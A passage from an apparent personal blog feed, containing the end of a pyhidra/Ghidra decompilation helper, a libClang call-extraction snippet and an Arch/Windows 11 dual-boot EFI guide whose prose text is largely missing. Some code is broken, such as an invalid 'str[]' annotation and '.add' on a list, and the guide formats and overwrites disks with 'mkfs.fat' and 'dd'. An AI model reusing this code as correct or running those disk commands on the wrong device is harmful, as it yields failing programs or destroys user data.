class="line"><span class="string">    :param analyze: Whether to run analysis before returning.</span></span><br><span class="line"><span class="string">    :param language: The LanguageID to use for the program.</span></span><br><span class="line"><span class="string">        (Defaults to Ghidra&#x27;s detected LanguageID)</span></span><br><span class="line"><span class="string">    :param compiler: The CompilerSpecID to use for the program. Requires a provided language.</span></span><br><span class="line"><span class="string">        (Defaults to the Language&#x27;s default compiler)</span></span><br><span class="line"><span class="string">    :return: A Ghidra FlatProgramAPI object.</span></span><br><span class="line"><span class="string">    :raises ValueError: If the provided language or compiler is invalid.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> _project, _program_pool</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> pyhidra.launcher <span class="keyword">import</span> PyhidraLauncher, HeadlessPyhidraLauncher</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> PyhidraLauncher.has_launched():</span><br><span class="line">        HeadlessPyhidraLauncher().start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> ghidra.app.script <span class="keyword">import</span> GhidraScriptUtil</span><br><span class="line">    <span class="keyword">from</span> ghidra.program.flatapi <span class="keyword">import</span> FlatProgramAPI</span><br><span class="line">    </span><br><span class="line">    program =  _program_pool.get(binary_path.name, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> program == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> _project == <span class="literal">None</span>:</span><br><span class="line">            project, program = _setup_project(</span><br><span class="line">                binary_path,</span><br><span class="line">                project_location,</span><br><span class="line">                project_name,</span><br><span class="line">                language,</span><br><span class="line">                compiler</span><br><span class="line">            )</span><br><span class="line">            _project = project</span><br><span class="line">            <span class="comment"># _project.setDeleteOnClose(True)</span></span><br><span class="line">            atexit.register(_project.close)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            program = _setup_project2(</span><br><span class="line">                binary_path,</span><br><span class="line">                language,</span><br><span class="line">                compiler</span><br><span class="line">            )</span><br><span class="line">        _program_pool[binary_path.name] = program</span><br><span class="line">    GhidraScriptUtil.acquireBundleHostReference()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flat_api = FlatProgramAPI(program)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> analyze:</span><br><span class="line">            _analyze_program(flat_api, program)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># change base address</span></span><br><span class="line">        base_addr = flat_api.toAddr(GHIDRA_BASE)</span><br><span class="line">        <span class="keyword">if</span> flat_api.currentProgram.getImageBase() != base_addr:</span><br><span class="line">            flat_api.currentProgram.setImageBase(base_addr, <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">assert</span> flat_api.currentProgram.getImageBase() == base_addr</span><br><span class="line"></span><br><span class="line">        <span class="keyword">yield</span> flat_api</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        FAIL(<span class="string">&quot;--- Error while opening program:&quot;</span>, e)</span><br><span class="line">        FAIL(<span class="string">f&quot;binary <span class="subst">&#123;binary_path&#125;</span> in <span class="subst">&#123;project_location&#125;</span>&quot;</span>)</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        GhidraScriptUtil.releaseBundleHostReference()</span><br><span class="line">        <span class="comment"># project.save(program)</span></span><br><span class="line">        <span class="comment"># project.close()</span></span><br></pre></td></tr></table></figure><h3 id="1-1-"><a href="#1-1-" class="headerlink" title="1.1 "></a>1.1 </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyhidra</span><br><span class="line">pyhidra.start()</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> TYPE_CHECKING</span><br><span class="line"><span class="keyword">if</span> TYPE_CHECKING:</span><br><span class="line">    <span class="keyword">import</span> ghidra</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> ghidra.app.decompiler.flatapi <span class="keyword">import</span> FlatDecompilerAPI</span><br><span class="line"><span class="keyword">from</span> ghidra.program.flatapi <span class="keyword">import</span> FlatProgramAPI</span><br><span class="line"></span><br><span class="line">DATASET_PATH = Path(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">GHIDRA_DIR = Path(<span class="string">&quot;.&quot;</span>) <span class="comment"># Ghidra project location</span></span><br><span class="line">GHIDRA_PROJECT_NAME = <span class="string">&quot;test&quot;</span> <span class="comment"># Ghidra project name</span></span><br><span class="line">GHIDRA_BASE = <span class="number">0x400000</span> <span class="comment"># Ghidra base address, used in open_program</span></span><br><span class="line">FUNC_ADDRS: <span class="built_in">set</span>[<span class="built_in">str</span>] = <span class="built_in">set</span>() <span class="comment"># function addresses in binary (base addr is 0x0 in default)</span></span><br><span class="line"><span class="keyword">with</span> open_program(DATASET_PATH / <span class="string">&quot;test.so&quot;</span>, GHIDRA_DIR, GHIDRA_PROJECT_NAME) <span class="keyword">as</span> f_api:</span><br><span class="line">    f_api: FlatProgramAPI = f_api</span><br><span class="line">    decomp_api = FlatDecompilerAPI(f_api)</span><br><span class="line">    listing = f_api.currentProgram.getListing()</span><br><span class="line">    <span class="keyword">for</span> target <span class="keyword">in</span> FUNC_ADDRS:</span><br><span class="line">        func = f_api.getFunctionAt(f_api.toAddr(<span class="built_in">hex</span>(<span class="built_in">int</span>(target.addr, <span class="number">16</span>) + GHIDRA_BASE)))</span><br><span class="line">        acode = [] <span class="comment"># assembly code</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> listing.getCodeUnits(func.getBody(), <span class="literal">True</span>):</span><br><span class="line">            acode.append(i.toString())</span><br><span class="line">        panic_if_not(func <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, <span class="string">f&quot;[-] function not found at <span class="subst">&#123;target.addr&#125;</span> in <span class="subst">&#123;bin_name&#125;</span>&quot;</span>)</span><br><span class="line">        dcode = decomp_api.decompile(func, <span class="number">0</span>).strip() <span class="comment"># decompiled code</span></span><br><span class="line">        acode = <span class="string">&quot;\n&quot;</span>.join(acode)</span><br><span class="line">        <span class="built_in">print</span>(dcode, acode, sep=<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="1-2--Callee-"><a href="#1-2--Callee-" class="headerlink" title="1.2  Callee "></a>1.2  Callee </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> binary_search.pyhidra_helper <span class="keyword">import</span> open_program</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> GHIDRA_DIR, GHIDRA_PROJECT_NAME, GHIDRA_BASE</span><br><span class="line"><span class="keyword">from</span> helper <span class="keyword">import</span> INFO, panic_if_not, WARNING, OK</span><br><span class="line"><span class="keyword">from</span> ghidra.program.flatapi <span class="keyword">import</span> FlatProgramAPI</span><br><span class="line"><span class="keyword">from</span> ghidra.util.task <span class="keyword">import</span> ConsoleTaskMonitor</span><br><span class="line"><span class="keyword">from</span> ghidra.program.model.listing <span class="keyword">import</span> Function</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_deps</span>(<span class="params">function_addrs: <span class="built_in">set</span>[<span class="built_in">str</span>], elf: Path</span>) -&gt; <span class="built_in">set</span>[<span class="built_in">tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]]:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Search for dependencies of given functions in given binary.</span></span><br><span class="line"><span class="string">    :param function_addrs: set of function addresses in Ghidra in hex string</span></span><br><span class="line"><span class="string">    :param elf: path to binary</span></span><br><span class="line"><span class="string">    :return: set of function addresses in Ghidra in hex string</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    known_addrs: <span class="built_in">str</span>[] = []</span><br><span class="line">    INFO(<span class="string">f&quot;[+] binary searching for deps for <span class="subst">&#123;<span class="built_in">len</span>(function_addrs)&#125;</span> functions in <span class="subst">&#123;elf&#125;</span>&quot;</span>)</span><br><span class="line">    panic_if_not(elf.exists(), <span class="string">f&quot;[-] <span class="subst">&#123;elf&#125;</span> not found&quot;</span>)</span><br><span class="line">    funcs: <span class="built_in">set</span>[<span class="built_in">tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]] = <span class="built_in">set</span>()</span><br><span class="line">    monitor = ConsoleTaskMonitor()</span><br><span class="line">    <span class="keyword">with</span> open_program(elf, GHIDRA_DIR, GHIDRA_PROJECT_NAME) <span class="keyword">as</span> f_api:</span><br><span class="line">        f_api: FlatProgramAPI = f_api <span class="comment"># for type hint</span></span><br><span class="line">        <span class="keyword">for</span> addr <span class="keyword">in</span> tqdm(function_addrs):</span><br><span class="line">            <span class="comment"># panic_if_not(int(addr, 16) &gt; GHIDRA_BASE, f&quot;[-] invalid address for Ghidra base &#123;addr&#125; &lt; &#123;hex(GHIDRA_BASE)&#125;&quot;)</span></span><br><span class="line">            func = f_api.getFunctionAt(f_api.toAddr(addr))</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                WARNING(<span class="string">f&quot;[-] function not found at <span class="subst">&#123;addr&#125;</span> in <span class="subst">&#123;elf&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># find CFG</span></span><br><span class="line">            called_funcs: <span class="built_in">set</span>[Function] = func.getCalledFunctions(monitor)</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> called_funcs:</span><br><span class="line">                addr: <span class="built_in">str</span> = f.getEntryPoint().toString() <span class="comment"># type: ignore</span></span><br><span class="line">                <span class="keyword">if</span> addr <span class="keyword">in</span> known_addrs:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                known_addrs.add(addr)</span><br><span class="line">                funcs.add((f.getName(), addr)) <span class="comment"># type: ignore</span></span><br><span class="line">        OK(<span class="string">f&quot;[+] found <span class="subst">&#123;<span class="built_in">len</span>(funcs)&#125;</span> functions as deps in <span class="subst">&#123;elf&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> funcs</span><br></pre></td></tr></table></figure><center> -EOF- </center>]]></content>
      
      
      <categories>
          
          <category> HelperCodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> reverse </tag>
            
            <tag> static analysis </tag>
            
            <tag> pyhidra </tag>
            
            <tag> Ghidra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python  libClang </title>
      <link href="/2023/12/04/python-libClang-static-analysis/"/>
      <url>/2023/12/04/python-libClang-static-analysis/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>libClang</code>  python binding (?) C&#x2F;C++ </p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ol><li>,  <code>#ifdef</code>, , , </li><li><code>libClang</code>  AST  <code>clang -Xclang -ast-dump</code> , ,  <code>UNEXPOSED_DECL</code> </li></ol><h2 id="0-Prep"><a href="#0-Prep" class="headerlink" title="0. Prep"></a>0. Prep</h2><ol><li><code>libClang</code>  <code>clang</code> </li><li> <code>clang</code> <code>pacman -S clang</code></li><li> <code>libClang</code>  python binding <code>pacman -Ql clang | grep cindex.py</code> ( <code>clang /usr/lib/python3.11/site-packages/clang/cindex.py</code>)</li><li>[optional]  <code>pipenv</code> , ,  <code>/usr/lib/python3.11/site-packages/clang</code> </li><li> <code>clang.so</code>  <code>pacman -Ql clang | grep clang.so</code> ( <code>clang /usr/lib/libclang.so</code>)</li></ol><h2 id="1-Usage"><a href="#1-Usage" class="headerlink" title="1. Usage"></a>1. Usage</h2><h3 id="1-0-Basic-Usecase"><a href="#1-0-Basic-Usecase" class="headerlink" title="1.0 Basic Usecase"></a>1.0 Basic Usecase</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> clang.cindex <span class="keyword">as</span> cindex</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="comment"># folder of libclang.so, found in step 0.5</span></span><br><span class="line">cindex.Config.library_path = <span class="string">&quot;/usr/lib&quot;</span></span><br><span class="line"></span><br><span class="line">file = Path(<span class="string">&quot;test.c&quot;</span>)</span><br><span class="line">parser = cindex.Index.create()</span><br><span class="line">tu = parser.parse(file.absolute())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> tu.cursor.get_children():</span><br><span class="line">    node: cindex.Cursor = node <span class="comment"># for type hint</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">str</span>(node.location.file).endswith(<span class="string">&quot;.c&quot;</span>):</span><br><span class="line">        <span class="comment"># if no need to dive into header files</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(node.kind, node.spelling, node.extent.start)</span><br></pre></td></tr></table></figure><h3 id="1-1--CALL-EXPR-"><a href="#1-1--CALL-EXPR-" class="headerlink" title="1.1  CALL_EXPR "></a>1.1  CALL_EXPR </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_function_name_in_CALL_EXPR</span>(<span class="params">node: cindex.Cursor</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">assert</span> node.kind == cindex.CursorKind.CALL_EXPR</span><br><span class="line">    tmp = <span class="built_in">next</span>(node.get_children())</span><br><span class="line">    <span class="keyword">if</span> tmp.kind == cindex.CursorKind.DECL_REF_EXPR:</span><br><span class="line">        DEBUG(<span class="string">f&quot;Fall back to DECL_REF_EXPR <span class="subst">&#123;tmp.spelling&#125;</span> <span class="subst">&#123;tmp.kind&#125;</span> <span class="subst">&#123;tmp.extent.start&#125;</span>&quot;</span>)</span><br><span class="line">        name = tmp.spelling</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        childs = [c <span class="keyword">for</span> c <span class="keyword">in</span> tmp.get_children()]</span><br><span class="line">        <span class="comment"># panic_if_not(len(childs) == 1, childs)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(childs) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> childs[<span class="number">0</span>].kind != cindex.CursorKind.DECL_REF_EXPR:</span><br><span class="line">            DEBUG(<span class="string">f&quot;(Skip indirect calling)UB in parse <span class="subst">&#123;childs[<span class="number">0</span>].spelling&#125;</span> <span class="subst">&#123;childs[<span class="number">0</span>].kind&#125;</span> <span class="subst">&#123;childs[<span class="number">0</span>].extent.start&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        name = childs[<span class="number">0</span>].spelling</span><br><span class="line">    <span class="keyword">return</span> name</span><br></pre></td></tr></table></figure><h3 id="1-2-"><a href="#1-2-" class="headerlink" title="1.2 "></a>1.2 </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_function</span>(<span class="params">node: cindex.Cursor</span>) -&gt; <span class="built_in">set</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">assert</span> node.kind == cindex.CursorKind.FUNCTION_DECL</span><br><span class="line">    dep_funcs = <span class="built_in">set</span>()</span><br><span class="line">    func_body = [n <span class="keyword">for</span> n <span class="keyword">in</span> node.get_children() <span class="keyword">if</span> n.kind == cindex.CursorKind.COMPOUND_STMT]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(func_body) == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># Can be forward-decline</span></span><br><span class="line">        DEBUG(<span class="string">f&quot;not found body, can be forward-decline <span class="subst">&#123;node.spelling&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> dep_funcs</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(func_body) == <span class="number">1</span></span><br><span class="line">    func_body: cindex.Cursor = func_body[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> child <span class="keyword">in</span> func_body.walk_preorder():</span><br><span class="line">        child: cindex.Cursor = child <span class="comment"># for type hint</span></span><br><span class="line">        <span class="keyword">if</span> child.kind == cindex.CursorKind.CALL_EXPR:</span><br><span class="line">            name = find_function_name_in_CALL_EXPR(child)</span><br><span class="line">            dep_funcs.add(name)</span><br><span class="line">    <span class="keyword">return</span> dep_funcs</span><br></pre></td></tr></table></figure><center> -EOF- </center>]]></content>
      
      
      <categories>
          
          <category> HelperCodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> libClang </tag>
            
            <tag> reverse </tag>
            
            <tag> static analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arch Win11 Dualboot  EFI </title>
      <link href="/2023/11/23/Arch-dualboot-efi/"/>
      <url>/2023/11/23/Arch-dualboot-efi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>:  Windows 11  ArchLinux ,  Windows  EFI  100MB , .<br> <code>os-prober</code>  Windows 11 ,  grub<br> <code>GPT</code><br> <code>sudo</code>,   </p></blockquote><p>TODO:  </p><ul><li><input disabled="" type="checkbox"> Arch  chainlaoder </li></ul><h2 id="0-"><a href="#0-" class="headerlink" title="0. "></a>0. </h2><ul><li>Arch </li><li> Windows PE ,  <a href="https://www.hirensbootcd.org/">Hirens BootCD PE</a>,  Arch ( <code>arch-chroot</code>) </li><li> 300MB  EFI , ,  ArchLinux </li></ul><h3 id="0-0--Hirens-BootCD-PE"><a href="#0-0--Hirens-BootCD-PE" class="headerlink" title="0.0  Hirens BootCD PE"></a>0.0  Hirens BootCD PE</h3><ol start="0"><li> ArchLinux </li><li> <a href="https://www.hirensbootcd.org/">Hirens BootCD PE</a>  ISO</li><li> U :<ol><li> <code>lsblk</code>  USB ,  <code>/dev/sdb</code></li><li> <code>cfdisk /dev/sdb</code> , </li><li> <code>mkfs.fat -F 32 /dev/sdb</code>  FAT32</li><li> <code>sudo dd bs=4M if=HBCD_PE_x64.iso of=/dev/sdb conv=fsync oflag=direct status=progress</code>  ISO</li></ol></li></ol><h3 id="0-1--EFI-"><a href="#0-1--EFI-" class="headerlink" title="0.1  EFI "></a>0.1  EFI </h3><ol start="0"><li> ArchLinux </li><li> <code>lsblk</code>  EFI ,  <code>/dev/nvme0n1</code> </li><li> <code>cfdisk /dev/nvme0n1</code>  300MB  EFI </li><li> <code>mkfs.fat -F 32 /dev/nvme0n1p7</code>  EFI  FAT32 ( <code>-F 32</code>  FAT16 )</li></ol><h2 id="1--Arch-"><a href="#1--Arch-" class="headerlink" title="1.  Arch "></a>1.  Arch </h2><ol start="0"><li> ArchLinux </li><li> <code>mount /dev/nvme0n1p7 /boot</code>  EFI , </li><li><code>grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB</code>  <code>grub</code> ,  <a href="https://wiki.archlinux.org/title/GRUB#Installation_2">ArchWiki</a><ul><li> <code>/boot/grub</code>  <code>grub</code> </li></ul></li><li><code>pacman -S linux intel-ucode</code>  ucode  img  EFI  ( intel  ucode,  <code>linux-lts</code>  <code>linux-lts</code>)<ul><li> <code>/boot</code>  <code>intel-ucode.img</code>, <code>vmlinuz-linux</code>, <code>initramfs-linux.img</code>  <code>initramfs-linux-fallback.img</code></li></ul></li><li> <code>/etc/default/grub</code>  <code>GRUB_DISABLE_OS_PROBER=&quot;false&quot;</code> ,  <code>os-prober</code></li><li> <code>/etc/grub.d/</code> ,  <code>cp 40_custom 10_linux</code>  ( 10 , 10  grub menu  40 ,  linux )</li><li><code>cat /etc/fstab</code>  EFI  ArchLinux  UUID,  <code>1111-A1B2</code>  <code>11111111-1111-1111-1111-111111111111</code></li><li> <code>/etc/grub.d/10_linux</code>,    <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">tail</span> -n +3 <span class="variable">$0</span></span><br><span class="line"><span class="comment"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="comment"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="comment"># the &#x27;exec tail&#x27; line above.</span></span><br><span class="line">menuentry <span class="string">&quot;Arch&quot;</span> &#123;</span><br><span class="line">        insmod part_gpt</span><br><span class="line">        insmod fat</span><br><span class="line">        insmod ext2</span><br><span class="line">        insmod gzio</span><br><span class="line">        <span class="built_in">set</span> root=<span class="string">&#x27;&lt;EFI DISK PARTISION ID&gt;&#x27;</span></span><br><span class="line">        search --no-floppy --fs-uuid --<span class="built_in">set</span>=root &lt;EFI UUID&gt;</span><br><span class="line">        linux /vmlinuz-linux root=UUID=&lt;ARCH UUID&gt; rw loglevel=3</span><br><span class="line">        initrd /intel-ucode.img /initramfs-linux.img</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <code>&lt;EFI DISK PARTISION ID&gt;</code>  EFI  (,  USB, )  <code>lsblk</code>  <code>/dev/nvme0n1</code> , <code>/dev/nvme0n1p7</code> 7,  <code>&#39;hd1,7&#39;</code>  <code>&#39;hd1,gpt7&#39;</code>  <code>(hd1,gpt7)</code>; <code>&lt;EFI UUID&gt;</code>  EFI  UUID; <code>&lt;ARCH UUID&gt;</code>  ArchLinux  UUID<br><code>/vmilinuz-linux</code> , <code>/intel-ucode.img</code>  ucode , <code>/initramfs-linux.img</code> ,  <code>/boot</code>  ( #1.3 )<br>:  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">tail</span> -n +3 <span class="variable">$0</span></span><br><span class="line"><span class="comment"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="comment"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="comment"># the &#x27;exec tail&#x27; line above.</span></span><br><span class="line">menuentry <span class="string">&quot;Arch&quot;</span> &#123;</span><br><span class="line">        insmod part_gpt</span><br><span class="line">        insmod fat</span><br><span class="line">        insmod ext2</span><br><span class="line">        insmod gzio</span><br><span class="line">        <span class="built_in">set</span> root=<span class="string">&#x27;hd1,gpt7&#x27;</span></span><br><span class="line">        search --no-floppy --fs-uuid --<span class="built_in">set</span>=root 1111-A1B2</span><br><span class="line">        linux /vmlinuz-linux root=UUID=11111111-1111-1111-1111-111111111111 rw loglevel=3</span><br><span class="line">        initrd /intel-ucode.img /initramfs-linux.img</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>grub-mkconfig -o /boot/grub/grub.cfg</code>  <code>grub.cfg</code></li><li>, ArchLinux </li></ol><h2 id="2--Windows-"><a href="#2--Windows-" class="headerlink" title="2.  Windows "></a>2.  Windows </h2><ol start="0"><li> Windows PE </li><li><code>diskpart</code> </li><li> EFI ,  EFI ,  <code>hd1,gpt7</code>,  <code>select disk 1</code>  <code>select partition 7</code></li><li><code>assign</code>  EFI </li><li> EFI ,  <code>E:</code></li><li>, <code>bcdboot C:\Windows /s E: /f UEFI</code> </li><li> EFI ,  <code>/EFI/Microsoft/Boot</code>,  Windows </li><li>, Windows </li></ol><h2 id="3--grub--Windows"><a href="#3--grub--Windows" class="headerlink" title="3.  grub  Windows"></a>3.  grub  Windows</h2><ol start="0"><li> ArchLinux </li><li><code>mount /dev/nvme0n1p7 /boot</code>  EFI , </li><li><code>cp /etc/grub.d/10_linux /etc/grub.d/10_windows</code> </li><li> <code>/etc/grub.d/10_windows</code> <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">tail</span> -n +3 <span class="variable">$0</span></span><br><span class="line"><span class="comment"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="comment"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="comment"># the &#x27;exec tail&#x27; line above.</span></span><br><span class="line">menuentry <span class="string">&quot;Windows 11&quot;</span> &#123;</span><br><span class="line">        insmod part_gpt</span><br><span class="line">        insmod fat</span><br><span class="line">        insmod ntfs</span><br><span class="line">        <span class="built_in">set</span> root=&lt;EFI DISK PARTITION ID&gt;</span><br><span class="line">        search --no-floppy --fs-uuid --<span class="built_in">set</span>=root &lt;EFI UUID&gt;</span><br><span class="line">        insmod chain</span><br><span class="line">        chainloader /EFI/Microsoft/Boot/bootmgfw.efi</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <code>&lt;EFI DISK PARTITION ID&gt;</code>  EFI ; <code>&lt;EFI UUID&gt;</code>  EFI  UUID<br><code>/EFI/Microsoft/Boot/bootmgfw.efi</code> 2 Windows PE <br>:  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">tail</span> -n +3 <span class="variable">$0</span></span><br><span class="line"><span class="comment"># This file provides an easy way to add custom menu entries.  Simply type the</span></span><br><span class="line"><span class="comment"># menu entries you want to add after this comment.  Be careful not to change</span></span><br><span class="line"><span class="comment"># the &#x27;exec tail&#x27; line above.</span></span><br><span 